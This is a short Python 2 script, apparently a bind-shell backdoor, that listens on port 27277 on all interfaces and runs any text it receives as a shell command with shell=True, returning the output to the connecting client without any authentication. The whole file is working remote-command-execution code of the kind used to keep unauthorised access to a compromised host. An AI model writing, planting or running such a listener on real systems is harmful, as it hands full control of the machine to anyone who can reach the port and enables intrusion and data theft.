#coding:utf-8
import os
import socket
import subprocess
HOST = '0.0.0.0'
PORT = 27277
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((HOST, PORT))
s.listen(5)
while True:
    conn, addr = s.accept()
    print 'Connected by', addr
    while True:
        command = conn.recv(1024)
        if not command:
            break
        if command == 'quit':
            break
        #data = os.popen(command).read()
        result = subprocess.Popen(command,shell=True,stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        data = result.stdout.read()
        conn.sendall(data)
    conn.close()
s.close()
